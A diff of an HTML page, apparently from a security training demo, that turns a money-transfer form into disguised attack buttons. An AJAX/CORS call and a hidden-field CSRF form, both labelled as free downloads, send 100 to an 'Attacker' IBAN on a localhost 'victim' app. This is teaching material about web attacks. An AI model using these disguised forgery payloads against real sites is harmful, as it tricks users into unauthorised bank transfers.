@@ -12,10 +12,7 @@
 
 <div style="border:2px solid green">
     <h4 style="color: red">XSS Attack: Transfer Money (via AJAX, CORS)</h4>
-    Recipient Full Name:<input type="text" id="fullName" value="John Doe" /> <br />
-    Recipient IBAN number:<input type="text" id="iban" value="12345678900" /> <br />
-    Amount:<input type="text" id="amount" value="100" /> <br />
-    <input type="button" value="Transfer" onclick="transferAmount()">
+    <input type="button" value="Download Free Stuff" onclick="transferAmount()">
 </div>
 
 
@@ -28,9 +25,9 @@
         $.ajax(restEndpoint +"/transfer-rest", {
             method: "POST",
             data: JSON.stringify({
-                recipientFullName:$("#fullName").val(),
-                recipientIban:$("#iban").val(),
-                amount:$("#amount").val()
+                recipientFullName:"Attacker",
+                recipientIban:"ATACKERIBAN013213",
+                amount:"100"
             }),
             contentType: "application/json",
             success: function(trainings) {
@@ -38,8 +35,17 @@
             }
         });
     }
-
-
 </script>
+
+<br/>
+<div style="border:2px solid red">
+    <h4 style="color:red;">Transfer Money (via FORM POST, XSRF)</h4>
+    <form method="post" action="http://localhost:8080/victim/transfer-form">
+        <input type="hidden" name="recipientFullName" value="Attacker" />
+        <input type="hidden" name="recipientIban" value="ATTACKERIBAN13123" />
+        <input type="hidden" name="amount" value="100" />
+        <input type="submit" value="Free Download!">
+    </form>
+</div>
 </body>
 </html>
